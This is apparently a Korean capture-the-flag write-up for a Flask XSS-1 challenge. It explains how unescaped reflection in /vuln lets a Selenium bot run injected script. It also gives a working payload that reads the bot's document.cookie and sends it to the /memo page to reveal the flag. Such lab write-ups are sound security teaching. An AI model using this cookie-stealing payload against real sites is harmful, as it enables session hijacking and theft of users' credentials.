# B2 · XSS-1

### 1. VM에 접속한다

첫 화면에서 `vuln(xss) page`, `memo`, `flag` 기능을 확인한다.

<img src="assets/01-home.png" alt="XSS-1 시작 화면" width="720">

### 2. 코드 분석 — XSS가 실행되는 과정

**① `/flag`에서 입력한 코드를 Selenium 봇에 전달한다.**

```python
param = request.form.get("param")
if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
    return '<script>alert("wrong??");history.go(-1);</script>'
```

입력한 스크립트가 `param`으로 전달되고, 봇에는 `flag`라는 이름의 **FLAG 쿠키**가 함께 설정된다.

**② 봇이 FLAG 쿠키를 가진 상태로 `/vuln`에 접속한다.**

```python
# check_xss() 내부
url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
return read_url(url, cookie)

# read_url() 내부
cookie.update({"domain": "127.0.0.1"})
driver.get("http://127.0.0.1:8000/")
driver.add_cookie(cookie)
driver.get(url)
```

`urllib.parse.quote()`는 입력값을 URL에 넣을 수 있게 인코딩한다. Selenium은 로컬 사이트를 연 뒤 쿠키를 등록하고, 스크립트가 담긴 URL을 방문한다.

**③ `/vuln`의 응답을 브라우저가 HTML로 처리하면서 스크립트가 실행된다.**

```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return param
```

`return param`은 **JavaScript를 실행하는 명령이 아니다.** Flask 함수가 `param` 문자열을 반환하면 Flask가 그 값을 **HTTP 응답 본문**으로 브라우저에 전송한다. 문자열 응답은 기본적으로 `text/html`로 처리된다.

예를 들어 `param`에 `<script>alert(1)</script>`가 들어오면, `return param`으로 그 태그가 **그대로 응답**된다. 이후 Selenium의 `driver.get(url)`로 페이지를 연 **Chrome이 HTML을 해석하면서 `<script>` 안의 JavaScript를 실행**한다.

**정리:** `param` 입력 → `/vuln`이 문자열 반환 → Flask가 HTML 응답 전송 → 봇의 Chrome이 스크립트 실행. Python의 `return` 자체가 스크립트를 실행하는 것은 아니다.

**④ 실행된 스크립트가 쿠키를 `/memo`로 전달한다.**

```python
@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)
```

봇에서 `document.cookie`로 읽은 값이 `memo` 파라미터로 전달되면 서버가 `memo_text`에 누적하고 화면에 표시한다.

### 3. XSS 코드 입력

`/flag` 입력창에 아래 코드를 제출한다.

```html
<script>
location.href='/memo?memo='+encodeURIComponent(document.cookie)
</script>
```

실행된 JavaScript가 봇의 쿠키를 읽어 `/memo` 주소로 전달한다. `encodeURIComponent()`는 쿠키 값을 URL에 안전하게 넣기 위한 처리다.

| 입력 전 | 코드 입력 후 |
| :---: | :---: |
| <img src="assets/02-flag-form.png" alt="flag 페이지 입력 전" width="430"> | <img src="assets/03-xss-payload.png" alt="XSS 코드 입력 후" width="430"> |

### 4. `/memo`에서 FLAG 확인

`/memo` 페이지에서 저장된 `flag=DH{...}` 값을 확인한다. `good` 알림만으로 성공을 확정하지 않고 **실제로 쿠키가 기록됐는지** 확인한다.

<img src="assets/04-memo-result.png" alt="memo에 FLAG 쿠키가 기록된 결과" width="760">

**취약점 원인:** `/vuln`이 사용자 입력을 이스케이프하지 않아 XSS가 실행되고, 봇의 FLAG 쿠키가 JavaScript에서 읽혀 `/memo`에 저장된다.
